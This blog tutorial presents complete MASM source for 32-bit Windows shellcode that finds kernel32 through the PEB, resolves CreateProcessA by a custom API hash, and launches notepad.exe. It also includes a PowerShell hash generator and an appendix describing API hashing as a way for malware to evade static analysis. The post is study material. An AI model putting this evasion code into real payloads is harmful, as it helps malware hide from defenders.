---
title: x32 Shellcode - Resolving Win32 APIs
date: 22-05-2023 12:00:00 -500
name: Terry-ngyx
categories: []
tags: []
---

## Introduction
![Process Injection](/assets/images/shellcode.png)

In this section, I present a proof of concept for a custom shellcode written in assembly. It originated from my personal study notes while exploring the intricacies of assembly programming and delving into the realm of position-independent shellcode. I hope this write-up proves beneficial in supporting others on their journey who are pursuing similar goals.

Also, note that all the headers for the code blocks state that the language is in nasm which is not true. We will be using masm in this PoC. The headers only specify nasm because the engine used to create these static HTML blogs only support syntax highlighting in nasm :cat: .

## What is shellcode?

Shellcode is a malicious code fragment that acts as a payload, enabling the execution of unauthorized actions. Its primary historical use involved establishing a command shell for attackers, providing unauthorized access to a targeted system, hence its name, shellcode.

Shellcode exhibits special attributes, with two distinct characteristics being:

1. Compact Size: Shellcode is designed to be small in size, ensuring it can fit within the limited memory space allocated to it. This is because shellcode is typically running in the memory space of a seperate process through techniques like code injection or side-loading
2. Position Independence: As shellcode operates within the memory space of a separate process, it must be position-independent. This allows the shellcode to access the required variables and dependencies for successful execution.


## Writing a win32 x32 shellcode
In this proof of concept (POC), our objective is to develop a position-independent shellcode that dynamically resolves Win32 APIs at runtime. The goal is to execute the shellcode successfully and utilize the CreateProcessA API to spawn the notepad.exe process. To accomplish this, we would need to obtain the absoluate address of the API in memory. This involves carrying out the steps outlined below:
\
&nbsp; 
&emsp;[1. Obtaining the image base of kernel32.dll](#obtaining-the-image-base-of-kernel32)
\
&nbsp;
&emsp;[2. Locating and Parsing the EXPORT_DIRECTORY table](#locating-and-parsing-the-export_directory-table)
\
&nbsp;
&emsp;[3. Calculating the API hash](#calculating-the-api-hash)
\
&nbsp;
&emsp;[4. Obtaining API addresses and hashes by iterating through the function tables](#obtaining-api-addresses-and-hashes-by-iterating-through-the-function-tables)
\
&nbsp;
&emsp;[5. Matching against the desired API through API hashes](#matching-against-the-desired-api-through-api-hashes)
\
&nbsp;
&emsp;[6. Calling the API](#calling-the-api)
\
&nbsp;

## Obtaining the image base of kernel32
The CreateProcessA API is a function that is exported by the kernel32.dll. The virtual address of the API is specified in the EXPORT_DIRECTORY structure in the library. Therefore, to obtain the absolute address of the CreateProcessA API, we first need to retrieve and parse the kernel32.dll PE (Portable Executable) structure.

To retrieve the image base address of kernel32, we can leverage the Process Environment Block (PEB) structure to locate the modules loaded by the current process running the shellcode. The PEB address is specified in the Thread Environment Block (TEB), which is stored in the fs segment register. The address of the PEB is located within the TEB structure at an offset of 0x30.

Once we have access to the PEB structure, the next step is to access the PEB_LDR_DATA. This data structure defines all the user-mode modules loaded by the process. The pointer to the PEB_LDR_DATA is located at an offset of 0x0C from the PEB structure.

Within the PEB_LDR_DATA, there are three main members: InLoadOrderModuleList, InMemoryOrderModuleList, and InInitializationOrderModuleList. These members are linked lists composed of entries of the LIST_ENTRY data type, containing all the modules loaded by the process. In this proof of concept (PoC), we will utilize the InLoadOrderModuleList. This list is particularly useful because kernel32.dll is typically the third module loaded in most Windows processes. However, it's worth noting that other linked lists also contain a LIST_ENTRY for kernel32.dll somewhere within them. 

The pointer to the first entry of the InLoadOrderModuleList can be found at an offset of 0x0C in the PEB_LDR_DATA structure. The first entry in the list always represents the current process, while the second entry usually corresponds to ntdll.dll, followed by kernel32.dll. By traversing the linked list twice, we can obtain the address of the LIST_ENTRY structure for kernel32.dll. Once we have the LIST_ENTRY, we can retrieve the base address located at an offset of 0x18.

By following this approach, we can dynamically obtain the image base address of kernel32.dll, enabling us to interact with its exported functions or perform other operations within the context of the loaded module.

```nasm
	;========================================
	;Locate kernel32.dll
	;========================================
	;required for MASM as accessing segment registers without this would result in an error
	ASSUME FS:NOTHING 
  
  	;loading address of PEB
	mov eax, fs:[30h]

	;get PEB_LDR_DATA
	mov ebx, [eax+0Ch]

	;get InLoadOrderModuleList LIST_ENTRY
	mov ebx, [ebx+0Ch]

	;accessing flink of the linked list to obtain ntdll LIST_ENTRY
	mov ebx, [ebx]
	
	;accessing flink to the linked list to obtain kernel32 LIST_NETRY
	mov ebx, [ebx]

	;get base address of kernel32
	mov esi, [ebx+18h]
	mov edi, esi
```

## Locating and Parsing the EXPORT_DIRECTORY table
Since we have obtained the base address of kernel32.dll, we can now traverse the PE structure to obtain the EXPORT_DIRECTORY table. The pointer to the EXPORT_DIRECTORY table is located in the first entry of the DATA_DIRECTORY of the IMAGE_OPTIONAL_HEADER. The EXPORT_DIRECTORY table contains the virtual addresses to three arrays which are AddressOfFunctions, AddressOfNameOrdinals and AddressOfNames:

- AddressOfNames
    - Array contains the names of the APIs that is exported by the DLLs
- AddressOfNameOrdinals
    - Array acts as a mapping between AddressOfNames and AddressOfFunctions.
    - The AddressOfNameOrdinals and AddressOfName arrays are aligned and each element of the AddressOfNameOrdinals array.
    - The AddressOfNameOrdinals array holds the ordinal of the element in the AddressOfName array.
    - The ordinal represents the index of the AddressOfFunctions array.
- AddressOfFunctions
    - The array contains the RVA of the corresponding APIs
	
| ![Export Directory](/assets/images/export_directory.png) | 
|:--:| 
| *Image taken from https://resources.infosecinstitute.com/topic/the-export-directory/* |

```nasm
	;========================================
	;Parse the EXPORT_DIRECTORY table
	;========================================
	;obtain the address of the IMAGE_EXPORT_DIRECTORY table
	mov eax, [esi].IMAGE_DOS_HEADER.e_lfanew
	add esi, eax
	mov eax, [esi].IMAGE_NT_HEADERS.OptionalHeader.DataDirectory[0].VirtualAddress
	add eax, edi
	mov esi, eax
	
	;obtain the AddressOfFunctions, AddressOfNameOrdinals and AddressOfNames tables
	mov eax, [esi].IMAGE_EXPORT_DIRECTORY.AddressOfFunctions
	add eax, edi
	mov AddressOfFunctions, eax

	mov eax, [esi].IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals
	add eax, edi
	mov AddressOfNameOrdinals, eax

	mov eax, [esi].IMAGE_EXPORT_DIRECTORY.AddressOfNames
	add eax, edi
	mov AddressOfNames, eax

	mov eax, [esi].IMAGE_EXPORT_DIRECTORY.NumberOfNames
	mov NumberOfNames, eax
```

## Calculating the API hash
Before we proceed further, we would need to cover API hashing. Our objective is to acquire the address of the CreateProcessA API. In this scenario, we will deviate from the approach of matching based on the function name and instead focus on matching against the API hash. For further insights into API hashing and the advantages, refer to the [Appendix](#appendix) section provided below. The API hashing that we will be using was derived from [ired.team API hashing](https://www.ired.team/offensive-security/defense-evasion/windows-api-hashing-in-malware): - 

$**hash += (($hash * 0x2) + $c) & 0xffffff**

- The initial hash value that will be used has the value ox 0x35 which is the same value in the ired.team writeup.
- The $c value is the current character in the function name that we are hashing.
- 0x2 is a random value picked to the likelyhood of hash collisions. I have modified this value from the one in the [ired.team](http://ired.team) writeup because I was experiencing hash collisions when the value was too large. This was as a result of us not utilising the carry overflow values and the bitmask only retaining the three lower order bytes.
- & 0xffffff is just used for bit masking the higher order bits of the hash values

Modifying the PowerShell script from ired.team, we can now emulate the hashing algorithm to obtain the hash for the CreateProcessA process which is 0x00b05617.

```powershell
$APIsToHash = @("CreateProcessA")

$APIsToHash | % {
    $api = $_
    
    $hash = 0x35
    [int]$i = 0
    $seed = [uint64]"0x2"
    $seed = '0x{0:x}' -f $seed 
    write-host "Iteration0 $seed"
    $api.ToCharArray() | % {
        $l = $_
        $c = [int64]$l
        $c = '0x{0:x}' -f $c

        $hash = $hash + (($hash * [uint64]$seed) + $c)
        $hash = $hash -band 0xffffff
        $hashHex = '0x{0:x}' -f $hash
        $i++
        write-host "Iteration $i : $l : $c : $hashHex"
    }
    write-host "$api`t $('0x00{0:x}' -f $hash)"
}
```

## Obtaining API addresses and hashes by iterating through the function tables
Now that we have the hash, we can start iterating through the arrays to obtain the API. For this, we would need to utilise all three arrays and carry out the following: -

- Obtain the name of the API in the current iteration from the AddressOfNames table.
- Take the index of the current API and go to the same index in the AddressOfNameOrdinals table.
- The ordinal value/element in the AddressOfNameOrdinals table indicates the index of the function in the AddressOfFunctions table.
- The value of the address for the API in the current iteration is now obtained.

```nasm

	;========================================
	;Loop through the AddressOfNames table
	;========================================
	xor ecx, ecx
	LoopTables:
	;initialise variable for API hashing
	mov Hash, 35h

	;initialise pointer to the first character of the function name
	mov eax, AddressOfNames
	mov eax, [eax+(ecx*4)]
	add eax, edi
	mov CharPointer, eax

	;obtain the ordinal number for the current function in the loop
	mov ebx, AddressOfNameOrdinals
	mov bx, [ebx+(ecx*2)]
	and ebx, 0000FFFFh

	;calculate the address of the current function in the loop and store on the stack
	mov edx, AddressOfFunctions
	mov edx, [edx+(ebx*4)]
	add edx, edi
	push edx ; save current address to the stack

	NextFunction:
	inc ecx
	cmp ecx, NumberOfNames
	jnz LoopTables
```

Once we have the address, we can now proceed to hash the name of the API in the current iteration. This is done by looping through all the characters in the API name string and carrying out our hashing algorithm discussed above. This is done until we reach the end of the string which is a null byte.

```nasm
	;Carry out API hashing
	ApiHashing:
	mov ebx, CharPointer
	mov bl, [ebx]
	and ebx, 000000FFh
	cmp ebx, 0
	je NextFunction 
	mov eax, 02h
	mul Hash
	add eax, ebx
	add eax, Hash
	and eax, 00FFFFFFh
	mov Hash, eax
	inc CharPointer
	jmp ApiHashing
```

## Matching against the desired API through API hashes
When the end of the string has been reached, the execution flow will jump to NextFunction label. By modifying the NextFunction label, we can check if the hash value of the API matches that of our pre-calculated hash for CreateProcessA which is 0x00b05617. If it matches, it would jump to our APIFound label. If not, it will proceed to the next API entry of the AddressOfNames table.

```nasm
	NextFunction:
	mov eax, [Hash]
	cmp eax, 00b05617h
	pop eax ; get the function address from the top of the stack
	je APIFound
	inc ecx
	cmp ecx, NumberOfNames
	jnz LoopTables
```

## Calling the API
Now that we have resolved the address of the CreateProcessA API as shown below, we can use it to call the API as we would do in a normal assembly program. 

```nasm
	;================================
	;Save address of desired function
	;================================
	APIFound:
	mov AddrOfCreateProcessA, eax
```
However, we have one caveat where we won’t be using the .data section to store variables (at least not in this POC). For the purpose of simplicity, we will just hardcode the variable values in the code itself and use it as arguments to the API.

According to the MSDN documentation, the CreateProcessA API requires the following arguments.

```cpp
BOOL CreateProcessA(
  [in, optional]      LPCSTR                lpApplicationName,
  [in, out, optional] LPSTR                 lpCommandLine,
  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
  [in]                BOOL                  bInheritHandles,
  [in]                DWORD                 dwCreationFlags,
  [in, optional]      LPVOID                lpEnvironment,
  [in, optional]      LPCSTR                lpCurrentDirectory,
  [in]                LPSTARTUPINFOA        lpStartupInfo,
  [out]               LPPROCESS_INFORMATION lpProcessInformation
);
```
To proceed, we need to provide three arguments: lpCommandLine, lpStartupInfo, and lpProcessInformation. Let's start with the PROCESS_INFORMATION structure. We can allocate the required memory space for this structure on the stack by allocating 88 bytes and then capturing the start address. Similarly, for the STARTUPINFO structure, we can allocate 32 bytes on the stack. As for lpCommandLine, we can directly push the null-terminated string "C:\\\Windows\\\System32\\\notepad.exe" onto the stack and retrieve its start address. 

While it may seem counter-intuitive to utilize plaintext strings after investing effort in API hashing, for the sake of simplicity in this proof of concept (PoC), we will continue to use them. However, it's important to note that masquerading techniques can be implemented to conceal the plaintext strings if desired. These techniques can add an additional layer of obfuscation and enhance the overall security of the shellcode.

With all the necessary arguments in place, we can now push these variables onto the stack and invoke the API to spawn the notepad.exe process.
```nasm
	;================================
	;Call CreateProcessA
	;================================
	;initialise PROCESS_INFORMATION Structure
	mov ecx, 00000044h
	zero_loop_pi:
	push 00000000h
	loop zero_loop_pi
	mov edi, esp

	;initialise STARTUPINFO Structure
	mov ecx, 00000016h
	zero_loop_si:
	push 00000000h
	loop zero_loop_si
	mov esi, esp

	;push C:\\Windows\\System32\\notepad.exe string to stack and save the address to edx
	push 00006578h ; ex
	push 652e6461h ; e.da
	push 7065746fh ; peto
	push 6e5c5c32h ; n\\2
	push 336d6574h ; 3met
	push 7379535ch ; syS\
	push 5c73776fh ; \swo
	push 646e6957h ; dniW
	push 5c5c3a43h ; \\:C
	mov edx, esp

	push edi ;__out        LPPROCESS_INFORMATION lpProcessInformation
	push esi ;__in         LPSTARTUPINFO lpStartupInfo,
	push 0h;__in_opt     LPCTSTR lpCurrentDirectory,
	push 0h;__in_opt     LPVOID lpEnvironment,
	push 0h;__in         DWORD dwCreationFlags,
	push 0h;__in         BOOL bInheritHandles,
	push 0h;__in_opt     LPSECURITY_ATTRIBUTES lpThreadAttributes,
	push 0h;__in_opt     LPSECURITY_ATTRIBUTES lpProcessAttributes,
	push 0h ;__inout_opt  LPTSTR lpCommandLine,
	push edx;__in_opt     LPCTSTR lpApplicationName,
	call AddrOfCreateProcessA
```

## Complete code
```nasm
.386
.model flat, stdcall
OPTION  CaseMap:None
include C:\masm32\include\windows.inc 
include C:\masm32\include\kernel32.inc 
includelib C:\masm32\lib\kernel32.lib 

.stack 4096

ExitProcess PROTO, dwExitCode: DWORD

.code

start:
main PROC
	Local AddressOfFunctions:DWord
	Local AddressOfNameOrdinals:DWord
	Local AddressOfNames:DWord
	Local NumberOfNames:DWord
	Local ImageBaseAddr:DWord
	Local Hash:DWord
	Local CharPointer:Dword
	Local AddrOfCreateProcessA:Dword

	;========================================
	;Locate kernel32.dll
	;========================================
	;required for MASM as accessing segment registers without this would result in an error
	ASSUME FS:NOTHING 
  
  ;loading address of PEB
	mov eax, fs:[30h]

	;get PEB_LDR_DATA
	mov ebx, [eax+0Ch]

	;get InLoadOrderModuleList LIST_ENTRY
	mov ebx, [ebx+0Ch]

	;accessing flink of the linked list to obtain ntdll LIST_ENTRY
	mov ebx, [ebx]
	
	;accessing flink to the linked list to obtain kernel32 LIST_NETRY
	mov ebx, [ebx]

	;get base address of kernel32
	mov esi, [ebx+18h]
	mov edi, esi

	;========================================
	;Parse the EXPORT_DIRECTORY table
	;========================================
	;obtain the address of the IMAGE_EXPORT_DIRECTORY table
	mov eax, [esi].IMAGE_DOS_HEADER.e_lfanew
	add esi, eax
	mov eax, [esi].IMAGE_NT_HEADERS.OptionalHeader.DataDirectory[0].VirtualAddress
	add eax, edi
	mov esi, eax
	
	;obtain the AddressOfFunctions, AddressOfNameOrdinals and AddressOfNames tables
	mov eax, [esi].IMAGE_EXPORT_DIRECTORY.AddressOfFunctions
	add eax, edi
	mov AddressOfFunctions, eax

	mov eax, [esi].IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals
	add eax, edi
	mov AddressOfNameOrdinals, eax

	mov eax, [esi].IMAGE_EXPORT_DIRECTORY.AddressOfNames
	add eax, edi
	mov AddressOfNames, eax

	mov eax, [esi].IMAGE_EXPORT_DIRECTORY.NumberOfNames
	mov NumberOfNames, eax

	;========================================
	;Loop through the AddressOfNames table
	;========================================
	xor ecx, ecx
	LoopTables:
	;initialise variable for API hashing
	mov Hash, 35h

	;initialise pointer to the first character of the function name
	mov eax, AddressOfNames
	mov eax, [eax+(ecx*4)]
	add eax, edi
	mov CharPointer, eax

	;obtain the ordinal number for the current function in the loop
	mov ebx, AddressOfNameOrdinals
	mov bx, [ebx+(ecx*2)]
	and ebx, 0000FFFFh

	;calculate the address of the current function in the loop and store on the stack
	mov edx, AddressOfFunctions
	mov edx, [edx+(ebx*4)]
	add edx, edi
	push edx

	;Carry out API hashing
	ApiHashing:
	mov ebx, CharPointer
	mov bl, [ebx]
	and ebx, 000000FFh
	cmp ebx, 0
	je NextFunction 
	mov eax, 02h
	mul Hash
	add eax, ebx
	add eax, Hash
	and eax, 00FFFFFFh
	mov Hash, eax
	inc CharPointer
	jmp ApiHashing
	
	NextFunction:
	mov eax, [Hash]
	cmp eax, 00b05617h
	pop eax ; get the function address from the top of the stack
	je APIFound
	inc ecx
	cmp ecx, NumberOfNames
	jnz LoopTables

	;================================
	;Save address of desired function
	;================================
	APIFound:
	mov AddrOfCreateProcessA, eax

	;================================
	;Call CreateProcessA
	;================================
	mov ecx, 00000044h
	zero_loop_pi:
	push 00000000h
	loop zero_loop_pi
	mov edi, esp

	;========================================
	;Initialise STARTUPINFO Structure
	;========================================
	mov ecx, 00000016h
	zero_loop_si:
	push 00000000h
	loop zero_loop_si
	mov esi, esp

	;push C:\\Windows\\System32\\notepad.exe string to stack and save the address to edx
	push 00006578h ; ex
	push 652e6461h ; e.da
	push 7065746fh ; peto
	push 6e5c5c32h ; n\\2
	push 336d6574h ; 3met
	push 7379535ch ; syS\
	push 5c73776fh ; \swo
	push 646e6957h ; dniW
	push 5c5c3a43h ; \\:C
	mov edx, esp
	
	push edi ;__out        LPPROCESS_INFORMATION lpProcessInformation
	push esi ;__in         LPSTARTUPINFO lpStartupInfo,
	push 0h;__in_opt     LPCTSTR lpCurrentDirectory,
	push 0h;__in_opt     LPVOID lpEnvironment,
	push 0h;__in         DWORD dwCreationFlags,
	push 0h;__in         BOOL bInheritHandles,
	push 0h;__in_opt     LPSECURITY_ATTRIBUTES lpThreadAttributes,
	push 0h;__in_opt     LPSECURITY_ATTRIBUTES lpProcessAttributes,
	push 0h ;__inout_opt  LPTSTR lpCommandLine,
	push edx;__in_opt     LPCTSTR lpApplicationName,
	call AddrOfCreateProcessA
	INVOKE ExitProcess, 0

main ENDP

END start
```
## Appendix
### What is API hashing
API hashing is a technique employed by malware authors to obfuscate and locate specific functions within an executable without directly specifying or storing the API names as plain strings. Typical steps in static analysis involves extracting ASCII strings and looking at the imports of the PE file. The strings often reveals identifiable IP addresses, domains, API names etc and the imports are clues to the capabilities of a program (encryption of files, initiates network connections, accesses other processes). 

API hashing adds a layer of indirection and complexity to evade detection of these techniques or similar techniques. In addition to that, API hashing reduces the size of the shellcode since function names are stored as hashes instead of strings which contain lesser bytes. This is an added benefit because shellcodes are frequently limited by size.

During runtime, an API hashing algorithm is utilized to generate a hash value based on the name or signature of the API function. The generated hash value is then compared to a pre-generated hash that is hardcoded in the malware. This matching process allows the malware to locate the desired functions dynamically without exposing the API names directly.

## References
- [https://www.codeproject.com/Articles/325776/The-Art-of-Win32-Shellcoding](https://www.codeproject.com/Articles/325776/The-Art-of-Win32-Shellcoding)
- [https://www.ired.team/offensive-security/defense-evasion/windows-api-hashing-in-malware](https://www.ired.team/offensive-security/defense-evasion/windows-api-hashing-in-malware)

<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-7CTE714YRJ"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-7CTE714YRJ');
</script>
